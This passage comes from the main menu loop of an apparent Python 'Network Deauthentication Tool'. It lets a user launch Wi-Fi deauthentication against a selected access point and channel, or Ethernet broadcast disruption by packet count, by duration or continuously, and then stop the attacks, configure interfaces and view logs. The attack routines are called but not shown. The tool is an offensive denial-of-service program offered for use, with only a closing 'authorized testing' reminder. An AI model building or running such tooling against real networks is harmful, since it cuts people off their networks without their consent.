                    deauth_all(selected_network['Interface'], "wlan",
                              selected_network['BSSID'], selected_network['Channel'])
                    
                else:
                    print("Invalid choice!")
            
            elif attack_type == '2':
                # Ethernet broadcast disruption
                if "eth" not in selected_interfaces or not selected_interfaces["eth"]:
                    print("No Ethernet interface configured!")
                    continue
                
                print("\nDisruption Options:")
                print("1. Send specific number of packets")
                print("2. Send for specific duration (seconds)")
                print("3. Continuous (until stopped)")
                
                attack_choice = input("Select option (1-3): ").strip()
                
                if attack_choice == '1':
                    count = int(input("Number of packets to send: "))
                    print(f"\nStarting broadcast disruption...")
                    print("Use Option 9 to stop the attack")
                    deauth_all(selected_interfaces["eth"], "eth", count=count)
                    
                elif attack_choice == '2':
                    duration = int(input("Duration in seconds: "))
                    print(f"\nStarting broadcast disruption for {duration} seconds...")
                    deauth_all(selected_interfaces["eth"], "eth", duration=duration)
                    
                elif attack_choice == '3':
                    print(f"\nStarting continuous broadcast disruption...")
                    print("Use Option 9 to stop the attack")
                    deauth_all(selected_interfaces["eth"], "eth")
                    
                else:
                    print("Invalid choice!")
            
            else:
                print("Invalid selection!")
        
        elif choice == '6':
            # Configure interfaces
            print("\nConfigure Interfaces:")
            print("1. Configure Wi-Fi interface")
            print("2. Configure Ethernet interface")
            print("3. Configure both interfaces")
            
            config_choice = input("Select option (1-3): ").strip()
            
            if config_choice == '1':
                iface = configure_interface("wlan")
                if iface:
                    selected_interfaces["wlan"] = iface
                    print(f"Wi-Fi interface set to: {iface}")
            
            elif config_choice == '2':
                iface = configure_interface("eth")
                if iface:
                    selected_interfaces["eth"] = iface
                    print(f"Ethernet interface set to: {iface}")
            
            elif config_choice == '3':
                wlan_iface = configure_interface("wlan")
                if wlan_iface:
                    selected_interfaces["wlan"] = wlan_iface
                
                eth_iface = configure_interface("eth")
                if eth_iface:
                    selected_interfaces["eth"] = eth_iface
                
                print(f"\nInterfaces configured:")
                print(f"Wi-Fi: {selected_interfaces.get('wlan', 'Not set')}")
                print(f"Ethernet: {selected_interfaces.get('eth', 'Not set')}")
            
            else:
                print("Invalid choice!")
        
        elif choice == '7':
            # Check adapter status
            check_adapter_status()
        
        elif choice == '8':
            # View logs
            view_logs()
        
        elif choice == '9':
            # Stop all attacks
            stop_all_attacks()
        
        elif choice == '10':
            # Exit
            stop_all_attacks()
            print("\nThank you for using Network Deauthentication Tool!")
            print("Remember: Use only for authorized testing!")
            print("Exiting...")
            break
        
        else:
            print("Invalid option! Please select 1-10.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        stop_all_attacks()
        print("Exiting...")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        logger.log("System_Error", "System", "", status=f"Unexpected error: {e}")